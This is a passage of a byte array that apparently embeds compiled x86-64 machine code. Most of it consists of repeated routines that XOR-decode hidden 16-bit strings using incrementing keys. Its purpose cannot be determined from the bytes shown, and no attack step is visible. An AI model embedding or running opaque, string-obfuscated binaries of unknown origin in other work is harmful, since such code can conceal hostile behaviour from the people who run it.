0x41, 0x26, 0x66, 0x89, 0x41, 0x68, 0xB8, 0x01, 0x01, 0x00, 0x00, 0x66, 0x33, 0x41, 0x28, 0x66,
0x89, 0x41, 0x6A, 0xB8, 0x02, 0x01, 0x00, 0x00, 0x66, 0x33, 0x41, 0x2A, 0x66, 0x89, 0x41, 0x6C,
0xB8, 0x03, 0x01, 0x00, 0x00, 0x66, 0x33, 0x41, 0x2C, 0x66, 0x89, 0x41, 0x6E, 0xB8, 0x04, 0x01,
0x00, 0x00, 0x66, 0x33, 0x41, 0x2E, 0x66, 0x89, 0x41, 0x70, 0xB8, 0x05, 0x01, 0x00, 0x00, 0x66,
0x33, 0x41, 0x30, 0x66, 0x89, 0x41, 0x72, 0xB8, 0x06, 0x01, 0x00, 0x00, 0x66, 0x33, 0x41, 0x32,
0x66, 0x89, 0x41, 0x74, 0xB8, 0x07, 0x01, 0x00, 0x00, 0x66, 0x33, 0x41, 0x34, 0x66, 0x89, 0x41,
0x76, 0xB8, 0x08, 0x01, 0x00, 0x00, 0x66, 0x33, 0x41, 0x36, 0x66, 0x89, 0x41, 0x78, 0xB9, 0x09,
0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x38, 0x49, 0x8D, 0x40, 0x42, 0x66, 0x41, 0x89, 0x48,
0x7A, 0xB9, 0x0A, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x3A, 0x66, 0x41, 0x89, 0x48, 0x7C,
0xB9, 0x0B, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x3C, 0x66, 0x41, 0x89, 0x48, 0x7E, 0xB9,
0x0C, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x3E, 0x66, 0x41, 0x89, 0x88, 0x80, 0x00, 0x00,
0x00, 0xB9, 0x0D, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x40, 0x66, 0x41, 0x89, 0x88, 0x82,
0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0xC1, 0xB8, 0xED, 0x00, 0x00, 0x00, 0x66, 0x33, 0x01, 0x66, 0x89, 0x41, 0x30, 0xB8,
0xEE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x02, 0x66, 0x89, 0x41, 0x32, 0xB8, 0xEF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x04, 0x66, 0x89, 0x41, 0x34, 0xB8, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x33,
0x41, 0x06, 0x66, 0x89, 0x41, 0x36, 0xB8, 0xF1, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x08, 0x66,
0x89, 0x41, 0x38, 0xB8, 0xF2, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0A, 0x66, 0x89, 0x41, 0x3A,
0xB8, 0xF3, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0C, 0x66, 0x89, 0x41, 0x3C, 0xB8, 0xF4, 0x00,
0x00, 0x00, 0x66, 0x33, 0x41, 0x0E, 0x66, 0x89, 0x41, 0x3E, 0xB8, 0xF5, 0x00, 0x00, 0x00, 0x66,
0x33, 0x41, 0x10, 0x66, 0x89, 0x41, 0x40, 0xB8, 0xF6, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x12,
0x66, 0x89, 0x41, 0x42, 0xB8, 0xF7, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x14, 0x66, 0x89, 0x41,
0x44, 0xB8, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x16, 0x66, 0x89, 0x41, 0x46, 0xB8, 0xF9,
0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x18, 0x66, 0x89, 0x41, 0x48, 0xB8, 0xFA, 0x00, 0x00, 0x00,
0x66, 0x33, 0x41, 0x1A, 0x66, 0x89, 0x41, 0x4A, 0xB8, 0xFB, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41,
0x1C, 0x66, 0x89, 0x41, 0x4C, 0xB8, 0xFC, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x1E, 0x66, 0x89,
0x41, 0x4E, 0xB8, 0xFD, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x20, 0x66, 0x89, 0x41, 0x50, 0xB8,
0xFE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x22, 0x66, 0x89, 0x41, 0x52, 0xB8, 0xFF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x24, 0x66, 0x89, 0x41, 0x54, 0xB9, 0x00, 0x01, 0x00, 0x00, 0x66, 0x41,
0x33, 0x48, 0x26, 0x49, 0x8D, 0x40, 0x30, 0x66, 0x41, 0x89, 0x48, 0x56, 0xB9, 0x01, 0x01, 0x00,
0x00, 0x66, 0x41, 0x33, 0x48, 0x28, 0x66, 0x41, 0x89, 0x48, 0x58, 0xB9, 0x02, 0x01, 0x00, 0x00,
0x66, 0x41, 0x33, 0x48, 0x2A, 0x66, 0x41, 0x89, 0x48, 0x5A, 0xB9, 0x03, 0x01, 0x00, 0x00, 0x66,
0x41, 0x33, 0x48, 0x2C, 0x66, 0x41, 0x89, 0x48, 0x5C, 0xB9, 0x04, 0x01, 0x00, 0x00, 0x66, 0x41,
0x33, 0x48, 0x2E, 0x66, 0x41, 0x89, 0x48, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0xC1, 0xB8, 0xED, 0x00, 0x00, 0x00, 0x66, 0x33, 0x01, 0x66, 0x89, 0x41, 0x34, 0xB8,
0xEE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x02, 0x66, 0x89, 0x41, 0x36, 0xB8, 0xEF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x04, 0x66, 0x89, 0x41, 0x38, 0xB8, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x33,
0x41, 0x06, 0x66, 0x89, 0x41, 0x3A, 0xB8, 0xF1, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x08, 0x66,
0x89, 0x41, 0x3C, 0xB8, 0xF2, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0A, 0x66, 0x89, 0x41, 0x3E,
0xB8, 0xF3, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0C, 0x66, 0x89, 0x41, 0x40, 0xB8, 0xF4, 0x00,
0x00, 0x00, 0x66, 0x33, 0x41, 0x0E, 0x66, 0x89, 0x41, 0x42, 0xB8, 0xF5, 0x00, 0x00, 0x00, 0x66,
0x33, 0x41, 0x10, 0x66, 0x89, 0x41, 0x44, 0xB8, 0xF6, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x12,
0x66, 0x89, 0x41, 0x46, 0xB8, 0xF7, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x14, 0x66, 0x89, 0x41,
0x48, 0xB8, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x16, 0x66, 0x89, 0x41, 0x4A, 0xB8, 0xF9,
0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x18, 0x66, 0x89, 0x41, 0x4C, 0xB8, 0xFA, 0x00, 0x00, 0x00,
0x66, 0x33, 0x41, 0x1A, 0x66, 0x89, 0x41, 0x4E, 0xB8, 0xFB, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41,
0x1C, 0x66, 0x89, 0x41, 0x50, 0xB8, 0xFC, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x1E, 0x66, 0x89,
0x41, 0x52, 0xB8, 0xFD, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x20, 0x66, 0x89, 0x41, 0x54, 0xB8,
0xFE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x22, 0x66, 0x89, 0x41, 0x56, 0xB8, 0xFF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x24, 0x66, 0x89, 0x41, 0x58, 0xB8, 0x00, 0x01, 0x00, 0x00, 0x66, 0x33,
0x41, 0x26, 0x66, 0x89, 0x41, 0x5A, 0xB8, 0x01, 0x01, 0x00, 0x00, 0x66, 0x33, 0x41, 0x28, 0x66,
0x89, 0x41, 0x5C, 0xB9, 0x02, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x2A, 0x49, 0x8D, 0x40,
0x34, 0x66, 0x41, 0x89, 0x48, 0x5E, 0xB9, 0x03, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x2C,
0x66, 0x41, 0x89, 0x48, 0x60, 0xB9, 0x04, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x2E, 0x66,
0x41, 0x89, 0x48, 0x62, 0xB9, 0x05, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x30, 0x66, 0x41,
0x89, 0x48, 0x64, 0xB9, 0x06, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x32, 0x66, 0x41, 0x89,
0x48, 0x66, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0xC1, 0xB8, 0xED, 0x00, 0x00, 0x00, 0x66, 0x33, 0x01, 0x66, 0x89, 0x41, 0x28, 0xB8,
0xEE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x02, 0x66, 0x89, 0x41, 0x2A, 0xB8, 0xEF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x04, 0x66, 0x89, 0x41, 0x2C, 0xB8, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x33,
0x41, 0x06, 0x66, 0x89, 0x41, 0x2E, 0xB8, 0xF1, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x08, 0x66,
0x89, 0x41, 0x30, 0xB8, 0xF2, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0A, 0x66, 0x89, 0x41, 0x32,
0xB8, 0xF3, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0C, 0x66, 0x89, 0x41, 0x34, 0xB8, 0xF4, 0x00,
0x00, 0x00, 0x66, 0x33, 0x41, 0x0E, 0x66, 0x89, 0x41, 0x36, 0xB8, 0xF5, 0x00, 0x00, 0x00, 0x66,
0x33, 0x41, 0x10, 0x66, 0x89, 0x41, 0x38, 0xB8, 0xF6, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x12,
0x66, 0x89, 0x41, 0x3A, 0xB8, 0xF7, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x14, 0x66, 0x89, 0x41,
0x3C, 0xB8, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x16, 0x66, 0x89, 0x41, 0x3E, 0xB8, 0xF9,
0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x18, 0x66, 0x89, 0x41, 0x40, 0xB8, 0xFA, 0x00, 0x00, 0x00,
0x66, 0x33, 0x41, 0x1A, 0x66, 0x89, 0x41, 0x42, 0xB8, 0xFB, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41,
0x1C, 0x66, 0x89, 0x41, 0x44, 0xB9, 0xFC, 0x00, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x1E, 0x49,
0x8D, 0x40, 0x28, 0x66, 0x41, 0x89, 0x48, 0x46, 0xB9, 0xFD, 0x00, 0x00, 0x00, 0x66, 0x41, 0x33,
0x48, 0x20, 0x66, 0x41, 0x89, 0x48, 0x48, 0xB9, 0xFE, 0x00, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48,
0x22, 0x66, 0x41, 0x89, 0x48, 0x4A, 0xB9, 0xFF, 0x00, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x24,
0x66, 0x41, 0x89, 0x48, 0x4C, 0xB9, 0x00, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x26, 0x66,
0x41, 0x89, 0x48, 0x4E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0xC1, 0xB8, 0xED, 0x00, 0x00, 0x00, 0x66, 0x33, 0x01, 0x66, 0x89, 0x41, 0x2C, 0xB8,
0xEE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x02, 0x66, 0x89, 0x41, 0x2E, 0xB8, 0xEF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x04, 0x66, 0x89, 0x41, 0x30, 0xB8, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x33,
0x41, 0x06, 0x66, 0x89, 0x41, 0x32, 0xB8, 0xF1, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x08, 0x66,
0x89, 0x41, 0x34, 0xB8, 0xF2, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0A, 0x66, 0x89, 0x41, 0x36,
0xB8, 0xF3, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0C, 0x66, 0x89, 0x41, 0x38, 0xB8, 0xF4, 0x00,
0x00, 0x00, 0x66, 0x33, 0x41, 0x0E, 0x66, 0x89, 0x41, 0x3A, 0xB8, 0xF5, 0x00, 0x00, 0x00, 0x66,
0x33, 0x41, 0x10, 0x66, 0x89, 0x41, 0x3C, 0xB8, 0xF6, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x12,
0x66, 0x89, 0x41, 0x3E, 0xB8, 0xF7, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x14, 0x66, 0x89, 0x41,
0x40, 0xB8, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x16, 0x66, 0x89, 0x41, 0x42, 0xB8, 0xF9,
0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x18, 0x66, 0x89, 0x41, 0x44, 0xB8, 0xFA, 0x00, 0x00, 0x00,
0x66, 0x33, 0x41, 0x1A, 0x66, 0x89, 0x41, 0x46, 0xB8, 0xFB, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41,
0x1C, 0x66, 0x89, 0x41, 0x48, 0xB8, 0xFC, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x1E, 0x66, 0x89,
0x41, 0x4A, 0xB8, 0xFD, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x20, 0x66, 0x89, 0x41, 0x4C, 0xB9,
0xFE, 0x00, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x22, 0x49, 0x8D, 0x40, 0x2C, 0x66, 0x41, 0x89,
0x48, 0x4E, 0xB9, 0xFF, 0x00, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x24, 0x66, 0x41, 0x89, 0x48,
0x50, 0xB9, 0x00, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x26, 0x66, 0x41, 0x89, 0x48, 0x52,
0xB9, 0x01, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x28, 0x66, 0x41, 0x89, 0x48, 0x54, 0xB9,
0x02, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x2A, 0x66, 0x41, 0x89, 0x48, 0x56, 0xC3, 0xCC,
0x4C, 0x8B, 0xC1, 0xB8, 0xED, 0x00, 0x00, 0x00, 0x66, 0x33, 0x01, 0x66, 0x89, 0x41, 0x2E, 0xB8,
0xEE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x02, 0x66, 0x89, 0x41, 0x30, 0xB8, 0xEF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x04, 0x66, 0x89, 0x41, 0x32, 0xB8, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x33,
0x41, 0x06, 0x66, 0x89, 0x41, 0x34, 0xB8, 0xF1, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x08, 0x66,
0x89, 0x41, 0x36, 0xB8, 0xF2, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0A, 0x66, 0x89, 0x41, 0x38,
0xB8, 0xF3, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0C, 0x66, 0x89, 0x41, 0x3A, 0xB8, 0xF4, 0x00,
0x00, 0x00, 0x66, 0x33, 0x41, 0x0E, 0x66, 0x89, 0x41, 0x3C, 0xB8, 0xF5, 0x00, 0x00, 0x00, 0x66,
0x33, 0x41, 0x10, 0x66, 0x89, 0x41, 0x3E, 0xB8, 0xF6, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x12,
0x66, 0x89, 0x41, 0x40, 0xB8, 0xF7, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x14, 0x66, 0x89, 0x41,
0x42, 0xB8, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x16, 0x66, 0x89, 0x41, 0x44, 0xB8, 0xF9,
0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x18, 0x66, 0x89, 0x41, 0x46, 0xB8, 0xFA, 0x00, 0x00, 0x00,
0x66, 0x33, 0x41, 0x1A, 0x66, 0x89, 0x41, 0x48, 0xB8, 0xFB, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41,
0x1C, 0x66, 0x89, 0x41, 0x4A, 0xB8, 0xFC, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x1E, 0x66, 0x89,
0x41, 0x4C, 0xB8, 0xFD, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x20, 0x66, 0x89, 0x41, 0x4E, 0xB8,
0xFE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x22, 0x66, 0x89, 0x41, 0x50, 0xB9, 0xFF, 0x00, 0x00,
0x00, 0x66, 0x41, 0x33, 0x48, 0x24, 0x49, 0x8D, 0x40, 0x2E, 0x66, 0x41, 0x89, 0x48, 0x52, 0xB9,
0x00, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x26, 0x66, 0x41, 0x89, 0x48, 0x54, 0xB9, 0x01,
0x01, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x28, 0x66, 0x41, 0x89, 0x48, 0x56, 0xB9, 0x02, 0x01,
0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x2A, 0x66, 0x41, 0x89, 0x48, 0x58, 0xB9, 0x03, 0x01, 0x00,
0x00, 0x66, 0x41, 0x33, 0x48, 0x2C, 0x66, 0x41, 0x89, 0x48, 0x5A, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0xC1, 0xB8, 0xED, 0x00, 0x00, 0x00, 0x66, 0x33, 0x01, 0x66, 0x89, 0x41, 0x3A, 0xB8,
0xEE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x02, 0x66, 0x89, 0x41, 0x3C, 0xB8, 0xEF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x04, 0x66, 0x89, 0x41, 0x3E, 0xB8, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x33,
0x41, 0x06, 0x66, 0x89, 0x41, 0x40, 0xB8, 0xF1, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x08, 0x66,
0x89, 0x41, 0x42, 0xB8, 0xF2, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0A, 0x66, 0x89, 0x41, 0x44,
0xB8, 0xF3, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0C, 0x66, 0x89, 0x41, 0x46, 0xB8, 0xF4, 0x00,
0x00, 0x00, 0x66, 0x33, 0x41, 0x0E, 0x66, 0x89, 0x41, 0x48, 0xB8, 0xF5, 0x00, 0x00, 0x00, 0x66,
0x33, 0x41, 0x10, 0x66, 0x89, 0x41, 0x4A, 0xB8, 0xF6, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x12,
0x66, 0x89, 0x41, 0x4C, 0xB8, 0xF7, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x14, 0x66, 0x89, 0x41,
0x4E, 0xB8, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x16, 0x66, 0x89, 0x41, 0x50, 0xB8, 0xF9,
0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x18, 0x66, 0x89, 0x41, 0x52, 0xB8, 0xFA, 0x00, 0x00, 0x00,
0x66, 0x33, 0x41, 0x1A, 0x66, 0x89, 0x41, 0x54, 0xB8, 0xFB, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41,
0x1C, 0x66, 0x89, 0x41, 0x56, 0xB8, 0xFC, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x1E, 0x66, 0x89,
0x41, 0x58, 0xB8, 0xFD, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x20, 0x66, 0x89, 0x41, 0x5A, 0xB8,
0xFE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x22, 0x66, 0x89, 0x41, 0x5C, 0xB8, 0xFF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x24, 0x66, 0x89, 0x41, 0x5E, 0xB8, 0x00, 0x01, 0x00, 0x00, 0x66, 0x33,
0x41, 0x26, 0x66, 0x89, 0x41, 0x60, 0xB8, 0x01, 0x01, 0x00, 0x00, 0x66, 0x33, 0x41, 0x28, 0x66,
0x89, 0x41, 0x62, 0xB8, 0x02, 0x01, 0x00, 0x00, 0x66, 0x33, 0x41, 0x2A, 0x66, 0x89, 0x41, 0x64,
0xB8, 0x03, 0x01, 0x00, 0x00, 0x66, 0x33, 0x41, 0x2C, 0x66, 0x89, 0x41, 0x66, 0xB8, 0x04, 0x01,
0x00, 0x00, 0x66, 0x33, 0x41, 0x2E, 0x66, 0x89, 0x41, 0x68, 0xB9, 0x05, 0x01, 0x00, 0x00, 0x66,
0x41, 0x33, 0x48, 0x30, 0x66, 0x41, 0x89, 0x48, 0x6A, 0xB9, 0x06, 0x01, 0x00, 0x00, 0x66, 0x41,
0x33, 0x48, 0x32, 0x66, 0x41, 0x89, 0x48, 0x6C, 0xB9, 0x07, 0x01, 0x00, 0x00, 0x66, 0x41, 0x33,
0x48, 0x34, 0x66, 0x41, 0x89, 0x48, 0x6E, 0x49, 0x8D, 0x40, 0x3A, 0xB9, 0x08, 0x01, 0x00, 0x00,
0x66, 0x41, 0x33, 0x48, 0x36, 0x66, 0x41, 0x89, 0x48, 0x70, 0xB9, 0x09, 0x01, 0x00, 0x00, 0x66,
0x41, 0x33, 0x48, 0x38, 0x66, 0x41, 0x89, 0x48, 0x72, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0xC1, 0xB8, 0xED, 0x00, 0x00, 0x00, 0x66, 0x33, 0x01, 0x66, 0x89, 0x41, 0x24, 0xB8,
0xEE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x02, 0x66, 0x89, 0x41, 0x26, 0xB8, 0xEF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x04, 0x66, 0x89, 0x41, 0x28, 0xB8, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x33,
0x41, 0x06, 0x66, 0x89, 0x41, 0x2A, 0xB8, 0xF1, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x08, 0x66,
0x89, 0x41, 0x2C, 0xB8, 0xF2, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0A, 0x66, 0x89, 0x41, 0x2E,
0xB8, 0xF3, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0C, 0x66, 0x89, 0x41, 0x30, 0xB8, 0xF4, 0x00,
0x00, 0x00, 0x66, 0x33, 0x41, 0x0E, 0x66, 0x89, 0x41, 0x32, 0xB8, 0xF5, 0x00, 0x00, 0x00, 0x66,
0x33, 0x41, 0x10, 0x66, 0x89, 0x41, 0x34, 0xB8, 0xF6, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x12,
0x66, 0x89, 0x41, 0x36, 0xB8, 0xF7, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x14, 0x66, 0x89, 0x41,
0x38, 0xB8, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x16, 0x66, 0x89, 0x41, 0x3A, 0xB8, 0xF9,
0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x18, 0x66, 0x89, 0x41, 0x3C, 0xB9, 0xFA, 0x00, 0x00, 0x00,
0x66, 0x41, 0x33, 0x48, 0x1A, 0x49, 0x8D, 0x40, 0x24, 0x66, 0x41, 0x89, 0x48, 0x3E, 0xB9, 0xFB,
0x00, 0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x1C, 0x66, 0x41, 0x89, 0x48, 0x40, 0xB9, 0xFC, 0x00,
0x00, 0x00, 0x66, 0x41, 0x33, 0x48, 0x1E, 0x66, 0x41, 0x89, 0x48, 0x42, 0xB9, 0xFD, 0x00, 0x00,
0x00, 0x66, 0x41, 0x33, 0x48, 0x20, 0x66, 0x41, 0x89, 0x48, 0x44, 0xB9, 0xFE, 0x00, 0x00, 0x00,
0x66, 0x41, 0x33, 0x48, 0x22, 0x66, 0x41, 0x89, 0x48, 0x46, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0xC1, 0xB8, 0xED, 0x00, 0x00, 0x00, 0x66, 0x33, 0x01, 0x66, 0x89, 0x41, 0x26, 0xB8,
0xEE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x02, 0x66, 0x89, 0x41, 0x28, 0xB8, 0xEF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x04, 0x66, 0x89, 0x41, 0x2A, 0xB8, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x33,
0x41, 0x06, 0x66, 0x89, 0x41, 0x2C, 0xB8, 0xF1, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x08, 0x66,
0x89, 0x41, 0x2E, 0xB8, 0xF2, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0A, 0x66, 0x89, 0x41, 0x30,
0xB8, 0xF3, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0C, 0x66, 0x89, 0x41, 0x32, 0xB8, 0xF4, 0x00,
0x00, 0x00, 0x66, 0x33, 0x41, 0x0E, 0x66, 0x89, 0x41, 0x34, 0xB8, 0xF5, 0x00, 0x00, 0x00, 0x66,
0x33, 0x41, 0x10, 0x66, 0x89, 0x41, 0x36, 0xB8, 0xF6, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x12,
0x66, 0x89, 0x41, 0x38, 0xB8, 0xF7, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x14, 0x66, 0x89, 0x41,
0x3A, 0xB8, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x16, 0x66, 0x89, 0x41, 0x3C, 0xB8, 0xF9,
0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x18, 0x66, 0x89, 0x41, 0x3E, 0xB8, 0xFA, 0x00, 0x00, 0x00,
0x66, 0x33, 0x41, 0x1A, 0x66, 0x89, 0x41, 0x40, 0xB9, 0xFB, 0x00, 0x00, 0x00, 0x66, 0x41, 0x33,
0x48, 0x1C, 0x49, 0x8D, 0x40, 0x26, 0x66, 0x41, 0x89, 0x48, 0x42, 0xB9, 0xFC, 0x00, 0x00, 0x00,
0x66, 0x41, 0x33, 0x48, 0x1E, 0x66, 0x41, 0x89, 0x48, 0x44, 0xB9, 0xFD, 0x00, 0x00, 0x00, 0x66,
0x41, 0x33, 0x48, 0x20, 0x66, 0x41, 0x89, 0x48, 0x46, 0xB9, 0xFE, 0x00, 0x00, 0x00, 0x66, 0x41,
0x33, 0x48, 0x22, 0x66, 0x41, 0x89, 0x48, 0x48, 0xB9, 0xFF, 0x00, 0x00, 0x00, 0x66, 0x41, 0x33,
0x48, 0x24, 0x66, 0x41, 0x89, 0x48, 0x4A, 0xC3, 0xFF, 0x25, 0xF2, 0x08, 0x00, 0x00, 0xCC, 0xCC,
0x48, 0x83, 0xEC, 0x48, 0xE8, 0x77, 0x04, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x45, 0x48, 0x83, 0x64,
0x24, 0x2C, 0x00, 0x48, 0x8D, 0x05, 0xA6, 0x0A, 0x00, 0x00, 0x83, 0x64, 0x24, 0x34, 0x00, 0x48,
0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x44, 0x24, 0x20, 0xC7, 0x44, 0x24, 0x28, 0x18, 0x00, 0x00,
0x00, 0xE8, 0x50, 0x05, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x18, 0x48, 0x8B, 0x15, 0x6F, 0x1A, 0x00,
0x00, 0x48, 0x8D, 0x0D, 0xA8, 0x17, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0xE8, 0x5E, 0x05,
0x00, 0x00, 0x48, 0x83, 0xC4, 0x48, 0xC3, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x0D, 0x8D,
0x17, 0x00, 0x00, 0xE8, 0x2C, 0x04, 0x00, 0x00, 0x4C, 0x8B, 0x05, 0x41, 0x1A, 0x00, 0x00, 0x48,
